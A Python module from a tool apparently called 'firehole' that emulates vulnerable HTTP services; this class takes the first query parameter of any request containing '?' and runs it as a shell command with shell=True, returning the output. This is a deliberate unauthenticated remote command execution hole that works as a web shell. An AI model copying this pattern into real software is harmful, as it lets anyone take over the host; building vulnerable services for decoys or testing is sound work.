import os
import subprocess
from firehole.utility.logger import logger
from firehole.http_s.vulnerabilities.abstract import VulnerabilityAbstract
from firehole.http_s.proxy import ProxyHandler
from urllib.parse import urlparse, parse_qs


class Vulnerability(VulnerabilityAbstract):
    def __init__(self, handler: ProxyHandler):
        self.handler = handler

    def detect_exploit(self):
        request_uri = self.handler.path
        if "?" in request_uri:
            logger.info("Exploit detected due to presence of '?' in the request URI.")
            return True
        return False

    def execute_command(self, command):
        try:
            # Execute the command and capture the output
            output = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT)
            return output.decode()  # Convert bytes to string
        except subprocess.CalledProcessError as e:
            return f"Error executing command: {e.output.decode()}"  # Return the error output

    def check(self) -> bool:
        if self.detect_exploit():

            # Parse the URL to extract query parameters
            parsed_url = urlparse(self.handler.path)
            query_params = parse_qs(parsed_url.query)

            # Check for any command parameter and extract its value
            command = None
            for key, value in query_params.items():
                command = value[0]  # Take the first value for the command
                break 

            if command:
                output = self.execute_command(command)

                # Sending the command output as the response
                self.handler.send_response(200)
                self.handler.send_header("Content-Type", "text/plain")
                self.handler.end_headers()
                self.handler.wfile.write(output.encode())
            else:
                logger.info("No command found in the query parameters.")

            return True

        logger.info("No exploit detected. Proceeding normally.")
        return False
